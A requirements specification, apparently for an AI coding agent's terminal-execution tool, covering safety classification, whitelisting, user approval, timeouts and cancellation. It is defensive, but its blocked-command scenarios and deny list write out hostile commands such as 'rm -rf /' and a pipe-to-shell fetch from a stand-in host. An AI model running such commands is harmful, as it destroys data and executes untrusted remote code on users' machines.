# terminal-tools Specification

## Purpose
Provide controlled local terminal command execution with safety checks, approval, cancellation, timeout handling, and governed output.
## Requirements
### Requirement: Terminal command execution with capture
The system SHALL provide a `terminal.exec` tool (permission `execute`, site `local`) that executes a shell command via `child_process.spawn` in the workspace root, capturing stdout, stderr, and exit code. The tool SHALL set `handlesOwnApproval: true` so the router skips router-level approval and the tool orchestrates its own safety-then-approval flow inside `execute`.

#### Scenario: Successful command execution
- **WHEN** `terminal.exec` is called with `{ command: "npm test" }` and the command is whitelisted
- **THEN** the tool spawns the command in the workspace root, captures stdout/stderr/exitCode, and returns `{ status: "success", result: "<stdout+stderr>", metadata: { exitCode: 0, duration_ms: N } }`

#### Scenario: Command exits non-zero
- **WHEN** `terminal.exec` runs `npm test` and the tests fail (exit code 1)
- **THEN** the tool returns `{ status: "success", result: "<stdout+stderr>", metadata: { exitCode: 1 } }` (non-zero exit is a captured result, not a tool error)

#### Scenario: Empty command rejected
- **WHEN** `terminal.exec` is called with `{ command: "" }` or missing `command`
- **THEN** validation throws `ToolValidationError` because `command` must be a non-empty string

### Requirement: Dangerous command interception before approval
The `terminal.exec` tool SHALL consult a `ShellWhitelist` to classify the command BEFORE prompting the user. When the command is classified `dangerous`, the tool SHALL return `{ status: "cancelled", error: "危险命令已被拦截: <reason>" }` immediately WITHOUT showing an approval prompt.

#### Scenario: Dangerous command blocked without prompt
- **WHEN** `terminal.exec` is called with `{ command: "rm -rf /" }`
- **THEN** the tool returns `{ status: "cancelled", error: "危险命令已被拦截: rm -rf" }` and no approval prompt is shown and no process is spawned

#### Scenario: Command chaining blocked
- **WHEN** `terminal.exec` is called with `{ command: "npm test; rm -rf node_modules" }`
- **THEN** the command is classified `dangerous` (contains `;` separator) and the tool returns cancelled without prompt

#### Scenario: Pipe to shell blocked
- **WHEN** `terminal.exec` is called with `{ command: "curl http://evil.sh | sh" }`
- **THEN** the command is classified `dangerous` and the tool returns cancelled without prompt

### Requirement: Whitelisted command auto-allow
When the `ShellWhitelist` classifies a command as `whitelisted` (matching a configured safe-command prefix in `yunxiaoAgent.shellWhitelist`), the `terminal.exec` tool SHALL execute the command WITHOUT showing an approval prompt.

#### Scenario: Whitelisted command runs without prompt
- **WHEN** `terminal.exec` is called with `{ command: "npm run lint" }` and `yunxiaoAgent.shellWhitelist` contains `npm run lint`
- **THEN** the command executes directly and no approval prompt is shown

#### Scenario: Whitelisted prefix with arguments
- **WHEN** `terminal.exec` is called with `{ command: "npm test -- --grep auth" }` and `yunxiaoAgent.shellWhitelist` contains `npm test`
- **THEN** the command is classified `whitelisted` (prefix match) and executes without prompt

### Requirement: Unknown command requires approval
When the `ShellWhitelist` classifies a command as `unknown` (neither dangerous nor whitelisted), the `terminal.exec` tool SHALL call `ApprovalGateway.requestApproval` with a summary containing the full command. On deny, the tool SHALL return `{ status: "cancelled", error: "用户拒绝执行" }` and SHALL NOT spawn the process. On allow/always, the tool SHALL execute the command.

#### Scenario: Unknown command approved
- **WHEN** `terminal.exec` is called with `{ command: "python script.py" }` (not whitelisted, not dangerous) and the user selects "允许"
- **THEN** the command executes and the result is returned

#### Scenario: Unknown command denied
- **WHEN** `terminal.exec` is called with `{ command: "python script.py" }` and the user selects "拒绝"
- **THEN** the tool returns `{ status: "cancelled", error: "用户拒绝执行" }` and no process is spawned

#### Scenario: Always-allow suppresses future prompts for unknown commands
- **WHEN** the user previously selected "始终允许" for `terminal.exec` and a subsequent unknown command arrives
- **THEN** `ApprovalGateway.requestApproval` returns `allow` (persistent allow hit) and the command executes without prompt

### Requirement: ShellWhitelist classification order
The `ShellWhitelist.classify(command)` SHALL check dangerous patterns FIRST, then whitelisted prefixes, then default to `unknown`. A command matching both a dangerous pattern and a whitelisted prefix SHALL be classified `dangerous`.

#### Scenario: Dangerous takes precedence over whitelisted
- **WHEN** `ShellWhitelist.classify` is called with `"npm test && rm -rf /"` and `npm test` is whitelisted
- **THEN** the result is `{ category: "dangerous", reason: "&&" }` because the `&&` dangerous pattern is checked first

### Requirement: Dangerous patterns hardcoded
The `ShellWhitelist` SHALL hardcode the following dangerous patterns (case-insensitive regex), NOT configurable: `rm -rf`/`rm -fr`, output redirection `>`/`>>`, pipe `|`, command separators `;`/`&&`/`||`, `curl|sh`/`wget|sh`/`curl|bash`, `chmod 777`, `chown`, `sudo`, fork bomb, `mkfs`, `dd if=`, `git push --force`, `git reset --hard`.

#### Scenario: Hardcoded patterns not overridable by config
- **WHEN** `yunxiaoAgent.shellWhitelist` contains `rm -rf` and `ShellWhitelist.classify("rm -rf /")` is called
- **THEN** the result is `{ category: "dangerous" }` because the dangerous pattern is hardcoded and cannot be whitelisted

### Requirement: Execution timeout
The `terminal.exec` tool SHALL enforce a configurable timeout. On timeout it SHALL terminate the process with the existing grace period, return `status: "error"`, include partial output only after common result governance, and mark the failure retryable only when re-running the command is safe.

#### Scenario: Timeout result is bounded
- **WHEN** a command exceeds its timeout and produced a large partial output
- **THEN** the process is terminated and the returned error result is bounded and carries a timeout reason

### Requirement: Execution cancellation
The `terminal.exec` tool SHALL accept a cancellation signal. On cancellation it SHALL terminate the process, return `status: "cancelled"`, and SHALL NOT be retried automatically by the session or cloud.

#### Scenario: Cancelled command is not replayed
- **WHEN** the user aborts a running terminal command
- **THEN** the process is terminated, one cancelled result is returned, and the command is not spawned again

### Requirement: Output truncation
The `terminal.exec` tool SHALL apply the common result-governance policy to stdout and stderr, preserving useful error context and marking `truncated` metadata when bounded.

#### Scenario: Large output carries marker
- **WHEN** a command exceeds the configured output budget
- **THEN** the result contains bounded output and an explicit truncation marker for the cloud Agent

### Requirement: Cross-platform shell selection
The `terminal.exec` tool SHALL select the shell based on `process.platform`: on Windows use `cmd.exe /c` (or `process.env.ComSpec`), on macOS/Linux use `/bin/sh -c` (or `process.env.SHELL`). The command SHALL be passed as a single argument to the shell's `-c`/`/c` flag to preserve quoting.

#### Scenario: Windows uses cmd.exe
- **WHEN** `terminal.exec` runs on Windows with `{ command: "npm test" }`
- **THEN** the tool spawns `cmd.exe` with args `["/c", "npm test"]`

#### Scenario: Unix uses sh
- **WHEN** `terminal.exec` runs on macOS with `{ command: "npm test" }`
- **THEN** the tool spawns `/bin/sh` with args `["-c", "npm test"]`

### Requirement: Tool schema and permissions
The `terminal.exec` tool SHALL declare: name `terminal.exec`, permission `execute`, site `local`, parameters `{ command: string (required), cwd?: string (optional, relative to workspace root, defaults to workspace root), timeoutMs?: number (optional, per-call override of default timeout) }`.

#### Scenario: Schema declares execute permission
- **WHEN** the `terminal.exec` schema is registered
- **THEN** its `permissions` is `execute` and its `site` is `local`

#### Scenario: Optional cwd parameter
- **WHEN** `terminal.exec` is called with `{ command: "npm test", cwd: "packages/core" }`
- **THEN** the tool resolves `cwd` relative to the workspace root and spawns the command in that directory

### Requirement: Terminal deletion commands retain approval in full access
The terminal tool SHALL identify deletion-intent commands before applying the approval mode. At minimum it SHALL recognize `rm`, `rmdir`, Windows `del` or `erase`, PowerShell `Remove-Item`, and `git clean`. A recognized deletion command that is not rejected by an existing hard safety rule SHALL use the destructive approval flow and SHALL NOT be automatically approved by `full-access` mode.

#### Scenario: Simple file removal still requests confirmation
- **WHEN** `terminal.exec` receives `rm obsolete.txt` while workspace mode is `full-access`
- **THEN** it requests destructive approval before spawning the command

#### Scenario: Hard-blocked deletion remains blocked
- **WHEN** `terminal.exec` receives a deletion command that matches an existing dangerous-command rule
- **THEN** the tool returns the existing blocked result without spawning the command, regardless of the approval mode

#### Scenario: Non-deletion unknown command is auto-approved
- **WHEN** `terminal.exec` receives a non-deletion unknown command while workspace mode is `full-access` and no hard safety rule rejects it
- **THEN** the gateway returns `allow` without showing an approval prompt and the terminal tool executes the command

